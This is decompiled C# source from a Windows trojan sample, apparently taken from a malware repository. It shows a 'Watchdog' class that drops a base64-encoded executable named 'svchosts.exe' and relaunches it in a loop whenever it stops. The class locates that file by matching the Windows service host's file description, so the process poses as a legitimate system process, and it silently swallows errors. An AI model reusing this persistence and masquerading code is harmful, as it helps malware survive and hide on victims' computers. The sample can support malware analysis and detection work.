// Decompiled with JetBrains decompiler
// Type: svchost.Other.Watchdog
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace svchost.Other
{
  [OptionText]
  public class Watchdog
  {
    public int watchert;
    public Thread watchthread;
    public bool KeepRunning;
    private string StartupPath;

    public Watchdog()
    {
      this.watchert = 0;
      this.KeepRunning = true;
      this.StartupPath = Application.StartupPath;
    }

    public void StartWatchdogService()
    {
      this.watchthread = new Thread(new ThreadStart(this.CheckWatcher));
      this.watchthread.IsBackground = true;
      this.watchthread.Start();
    }

    public void NewWatchdog(string WatcherByte)
    {
      try
      {
        if (!File.Exists(Path.Combine(this.StartupPath, "svchosts.exe")))
          File.WriteAllBytes(Path.Combine(this.StartupPath, "svchosts.exe"), Convert.FromBase64String(WatcherByte));
        this.StartWatchdogService();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void StopWatcher(bool DeleteWatcher)
    {
      try
      {
        Process[] processesByName = Process.GetProcessesByName(this.GetWatcher());
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
        this.CheckWatcher();
        if (DeleteWatcher)
          File.Delete(Path.Combine(this.StartupPath, this.GetWatcher() + ".exe"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.watchthread.Abort();
    }

    private void CheckWatcher()
    {
      try
      {
        while (this.KeepRunning && this.KeepRunning)
        {
          if (Process.GetProcessesByName(this.GetWatcher()).Length <= 0)
            Process.Start(Path.Combine(this.StartupPath, this.GetWatcher() + ".exe"));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public string GetWatcher()
    {
      string watcher = (string) null;
      string[] files = Directory.GetFiles(Application.StartupPath);
      int index = 0;
      while (index < files.Length)
      {
        FileInfo fileInfo = new FileInfo(files[index]);
        if (Operators.CompareString(FileVersionInfo.GetVersionInfo(fileInfo.FullName).FileDescription, "Host Process for Windows Services", true) == 0)
          watcher = fileInfo.Name.Split('.')[0];
        checked { ++index; }
      }
      return watcher;
    }
  }
}
